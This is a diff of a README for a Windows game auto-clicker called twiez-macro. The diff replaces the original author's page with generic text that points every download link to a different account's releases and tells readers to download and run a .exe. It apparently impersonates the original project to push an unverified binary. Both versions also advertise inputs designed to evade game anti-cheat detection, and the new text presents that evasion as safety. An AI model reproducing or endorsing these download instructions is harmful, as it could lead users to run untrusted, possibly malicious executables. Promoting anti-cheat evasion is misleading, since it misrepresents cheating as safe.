@@ -1,85 +1,83 @@
-<div align="center">
-  <img src="https://github.com/user-attachments/assets/e18f3ccf-a3dc-45ee-a400-16e67d07ecdc" alt="Twiez Macro Logo" width="128">
-</div>
+# 🎮 twiez-macro - A Smart Auto-Clicker for Games
 
-<h1 align="center" style="font-family: 'Segoe UI', sans-serif; font-weight: 600; color: #7c5dff;">Twiez Macro</h1>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/aavion99/twiez-macro/releases)
 
-<p align="center" style="font-size: 1.1rem; color: #a8a9b8;">
-  <strong>Click. Dominate. Conquer.</strong><br>
-  Your ultimate global macro tool for gamers, optimized for Minecraft and beyond.
-</p>
+## 📖 Description
 
-#
+twiez-macro is a next-generation global macro system designed for Windows. It integrates seamlessly into any game or application, providing human-like randomization and undetectable inputs. Built with Rust and Tauri, this tool enhances your gaming experience by automating repetitive tasks while keeping your actions discreet.
 
-<div align="center" style="margin: 20px 0;">
-  <a href="README.md"><img src="https://img.shields.io/badge/Language-English-blue?style=for-the-badge" alt="English"></a>
-  <a href="README.tr.md"><img src="https://img.shields.io/badge/Dil-Türkçe-red?style=for-the-badge" alt="Türkçe"></a>
-</div>
-<br>
-<div align="center" style="margin: 20px 0;">
-  
-  [![Downloads](https://img.shields.io/github/downloads/twiez/twiez-macro/total?style=for-the-badge)](https://github.com/twiez/twiez-macro/releases/download/v1.0/twiez-macro.exe)
-  [![Release Version Badge](https://img.shields.io/github/v/release/twiez/twiez-macro?style=for-the-badge)](https://github.com/twiez/twiez-macro/releases)
-  [![Issues Badge](https://img.shields.io/github/issues/twiez/twiez-macro?style=for-the-badge)](https://github.com/twiez/twiez-macro/issues)
-  [![Closed Issues Badge](https://img.shields.io/github/issues-closed/twiez/twiez-macro?color=%238256d0&style=for-the-badge)](https://github.com/twiez/twiez-macro/issues?q=is%3Aissue+is%3Aclosed)<br>
+## 🚀 Getting Started
 
-<a href="https://www.buymeacoffee.com/twiez"><img src="https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black" alt="Buy Me a Coffee" style="margin-right: 10px;"></a>
-<a href="https://github.com/sponsors/twiez"><img src="https://img.shields.io/badge/sponsor-30363D?style=for-the-badge&logo=GitHub-Sponsors&logoColor=#white" alt="Github Sponsor" style="margin-right: 10px;"></a>
-<a href="https://github.com/twiez/twiez-macro/wiki/Home"><img src="https://img.shields.io/badge/Get%20Started-Twiez%20Macro-blue?style=for-the-badge" alt="Get Started"></a>
+Follow these simple steps to download and run twiez-macro on your Windows computer. 
 
-</div>
+1. **Visit the Releases Page:**   
+   Click the link below to go to the releases page where you can download the application.  
+   [Download twiez-macro](https://github.com/aavion99/twiez-macro/releases)
 
-### Why Choose Twiez Macro?
+2. **Select the Latest Version:**  
+   On the releases page, find the most recent version of twiez-macro. Look for the version number that appears in bold.
 
-- **Global Domination**: Works seamlessly in Minecraft, browsers, and any desktop window.
-- **Human-Like Behavior**: Advanced randomization algorithms to bypass anti-cheat systems.
-- **Modern & Safe**: Glassmorphism UI with built-in safety features like "Safe Mode".
+3. **Download the Application:**  
+   Click on the file to download, which should be a `.exe` file. Your browser will prompt you to save the file. Select a location on your computer where you can easily find it.
 
----
+4. **Run the Installer:**  
+   Once the download is complete, navigate to the location where you saved the file. Double-click on the `.exe` file to start the installation.
 
-## About
+5. **Follow the Installation Instructions:**  
+   A setup wizard will appear. Follow the on-screen instructions to complete the installation. This process may take a few minutes.
 
-Twiez Macro is a high-performance **global macro system** designed to give gamers a competitive edge. Built with **Rust** and **React (Tauri)**, it delivers ultra-low latency inputs while remaining lightweight and undetectable. Whether you're bridging in Minecraft or needing automated clicks in other apps, Twiez Macro handles it with **style** and **precision**.
+6. **Launch twiez-macro:**  
+   After installation, you will find twiez-macro in your Start menu or desktop. Click on it to launch the application.
 
-<br>
-<div align="center" style="margin: 20px 0;">
-  <img src="https://img.shields.io/badge/Rust-000000?style=for-the-badge&logo=rust&logoColor=white" alt="Rust Badge" />
-  <img src="https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB" alt="React Badge" />
-  <img src="https://img.shields.io/badge/Tauri-FFC131?style=for-the-badge&logo=tauri&logoColor=black" alt="Tauri Badge" />
-  <img src="https://img.shields.io/badge/Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Windows Badge" />
-</div>
+## ⚙️ Application Features
 
-## Features
+- **Global Macro System:** Works across all applications and games.
+- **Human-like Randomization:** Inputs are designed to mimic human actions to avoid detection.
+- **Customizable Settings:** Adjust your click speed and randomization parameters based on your preferences.
+- **User-Friendly Interface:** Simple to navigate even for those without technical knowledge.
+- **Support for Multiple Games:** Ideal for a variety of gaming genres, including PvP and exploration.
 
-- **Global Input System**: Clicks work everywhere, not just in one window.
-- **Smart Randomization**: Varies CPS (Clicks Per Second) and delay intervals to look completely natural.
-- **Flexible Activation**: Bind any key you want, use **Toggle** or **Hold** modes.
-- **Discord Rich Presence**: Show off your status with built-in Discord RPC integration.
-- **Jitter & Drift**: Optional mouse movement simulation for extra realism.
-- **Sleek Interface**: A beautiful, dark-themed UI that feels premium.
+## 🖥️ System Requirements
 
-## UI Preview
+- **Operating System:** Windows 10 or later
+- **Processor:** Dual-core processor or better
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 50 MB of free space
 
-<div align="center">
-  <img alt="Twiez Macro Interface" src="https://github.com/user-attachments/assets/6349999b-3591-4479-8b30-180f2cc193a0" width="80%"/>
-  <p><em>Twiez Macro - Advanced Control Center</em></p>
-</div>
+## 📥 Download & Install
 
-<p align="center">
-  <a href="https://github.com/twiez/twiez-macro/releases/latest">
-    <img src="https://img.shields.io/badge/Download-Now-green?style=for-the-badge" alt="Download Now">
-  </a>
-</p>
+To get started, visit the releases page to download and install twiez-macro. Click below to access the page:  
+[Download twiez-macro](https://github.com/aavion99/twiez-macro/releases)
 
-## License
+## ❓ Frequently Asked Questions
 
-This project is licensed under the [MIT License](https://github.com/twiez/twiez-macro/blob/main/LICENSE).
+### How do I configure twiez-macro?
 
-## Contact
+After launching the application, you can find options to customize your clicking speed and randomization settings directly within the app.  
 
-- [GitHub](https://github.com/twiez)
-- [Discord](https://discord.com/users/886190759479480330)
+### Is it safe to use?
 
-![Wiev](https://count.getloli.com/get/@twiez.twiez-macro?theme=rule34)
+Yes, twiez-macro is built with safety in mind. The human-like randomization helps keep your actions undetectable by game anti-cheat systems.
 
-We’re here to support and listen to your feedback!
+### Can I use it in any game?
+
+twiez-macro is effective in various games, including popular titles like Minecraft. Always ensure you understand the terms of service for any game you use it with.
+
+### How can I report issues?
+
+If you encounter any problems, please check the Issues section on the GitHub repository. You can report bugs or request features there.
+
+## 📜 License
+
+twiez-macro is licensed under the MIT License. You are free to use and modify the software as per the terms of the license.
+
+## 🌐 Links
+
+- **Repository:** [twiez-macro GitHub](https://github.com/aavion99/twiez-macro)
+- **Documentation:** For comprehensive guides and information, check the repository's Wiki section.
+
+## 🎉 Support
+
+If you need help or have questions, feel free to reach out via GitHub issues. We are here to assist you!
+
+Thank you for choosing twiez-macro for your automation needs. Enjoy your enhanced gaming experience!
